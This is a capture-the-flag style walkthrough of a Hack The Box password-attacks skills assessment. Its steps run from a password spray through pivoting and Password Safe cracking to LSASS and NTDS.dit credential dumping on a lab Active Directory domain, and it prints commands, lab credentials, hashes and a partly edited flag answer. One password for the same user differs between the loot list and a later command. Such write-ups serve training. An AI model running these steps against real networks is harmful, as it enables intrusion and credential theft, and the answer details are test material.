### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Skills Assessment <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Skills Assessment - Password Attacks



The `Credential Theft Shuffle` (Sean Metcalf) — systematic AD compromise loop:

1. Initial access (phishing, weak svc cred)
2. Local admin via UAC bypass / vuln
3. Memory cred extraction (mimikatz / pypykatz)
4. Lateral movement w/ PtH or PtT
5. DA / DCSync → full domain
6. Persistence (golden ticket, skeleton key, etc.)

Mitigations: LAPS, MFA, restricted admin tiering, credential guard, monitor 4625 / 4768.

<br>

---

<br>

### Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites and may reuse it at work. Infiltrate Nexura, gain command execution on the DC.

| Host | IP |
|---|---|
| `DMZ01` | `10.129.182.184` (External), `172.16.119.13` (Internal) |
| `JUMP01` | `172.16.119.7` |
| `FILE01` | `172.16.119.10` |
| `DC01` | `172.16.119.11` |

Internal hosts are reachable only through DMZ01 — set up a SOCKS pivot.

Loot collected during the engagement:

	jbetty      xiao-nicer-wheels5
	bdavid      caramel-cigars-reply1
	stom        fails-nibble-disturb4
	hwilliam    warned-wobble-occur8
	stom        Kerberos: calves-warp-learning1

---

### Question 1:
What is the NTLM hash of NEXURA\Administrator?

External nmap:

```diff
+ $ sudo nmap -sT -sC -sV -A -p 1-9999 -v 10.129.182.184
```

	22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu

<br>

Generate username permutations from `Betty Jayde`:

```diff
+ $ ./username-anarchy -i /home/htb-ac-830862/b3tty.txt > /home/htb-ac-830862/b3ttery.txt
```

<br>

Spray the supplied password across the username list:

```diff
+ $ hydra -L /home/htb-ac-830862/b3ttery.txt -p 'Texas123!@#' ssh://10.129.182.184
```

	[22][ssh] host: 10.129.182.184   login: jbetty   password: Texas123!@#

<br>

SSH in:

```diff
+ $ ssh jbetty@10.129.182.184
```

<br>

Manual pillage of `.bash_history` reveals scripts + `sshpass` usage hinting at hwilliam@file01.

Set up a SOCKS pivot through DMZ01:

```diff
+ $ sudo nano /etc/proxychains4.conf
```

	socks4 127.0.0.1 9050

```diff
+ $ ssh -D 9050 jbetty@10.129.182.184
```

<br>

Internal nmap of FILE01:

```diff
+ $ sudo proxychains4 -q nmap -sT -A -Pn -p 445,3389,5985 172.16.119.10 -v
```

	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	5985/tcp open  http

<br>

Authenticate to FILE01 SMB as hwilliam (impacket variant — `smbclient` keeps disconnecting):

```diff
+ $ sudo proxychains4 python3 /usr/share/doc/python3-impacket/examples/smbclient.py nexura.htb/hwilliam:'dealer-screwed-gym1'@172.16.119.10
```

<br>

Five interesting shares. In `HR/archive/` there's `Employee-Passwords_OLD.psafe3` — Password Safe DB:

```diff
+ # get Employee-Passwords_OLD.psafe3
```

<br>

Transfer to cracking rig (base64), extract hash, crack:

```diff
+ $ pwsafe2john /home/st8less/Desktop/htb/boomigotyourwallet.psafe3 > 2butt2crack.txt
+ $ john --wordlist=/mnt/SSD_DATA/SecLists/rockyou.txt 2butt2crack.txt
```

	michaeljackson   (boomigotyourwallet)

<br>

Open vault in `pwsafe`, export XML — gets full creds for jbetty + bdavid + stom + hwilliam.

RDP to JUMP01 as bdavid through the pivot, dump LSASS:

```diff
+ $ sudo proxychains4 xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /drive:mineisyours,/home/htb-ac-830862/mineisyours
```

<br>

Move dump to attack box, parse:

```diff
+ $ pypykatz lsa minidump lsass.DMP
```

	username stom
		== MSV ==
			NT: 21ea958524cfd9a7791737f8d2f764fa
		== Kerberos ==
			Password: calves-warp-learning1

<br>

stom holds Domain Admin. RDP to DC01 with stom's Kerberos password (PtH was blocked by RDP account restrictions), then dump NTDS:

```diff
+ C:\Windows\system32>vssadmin CREATE SHADOW /For=C:
+ C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Users\stom\Desktop\NTDS.dit
+ C:\Windows\system32>reg.exe save hklm\system C:\Users\stom\Desktop\system.save
```

<br>

Drag both files to the share, secretsdump on attack box:

```diff
+ $ impacket-secretsdump -ntds /home/htb-ac-830862/mineisyours/NTDS.dit -system /home/htb-ac-830862/mineisyours/system.save LOCAL
```

	Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::

#### Note: question wording asks for "NTLM" but the input only validates the NT half.

&#x1F6A9; found **36e09e1e6ade--edit--94d63fbcab5e5b8d6d23**.
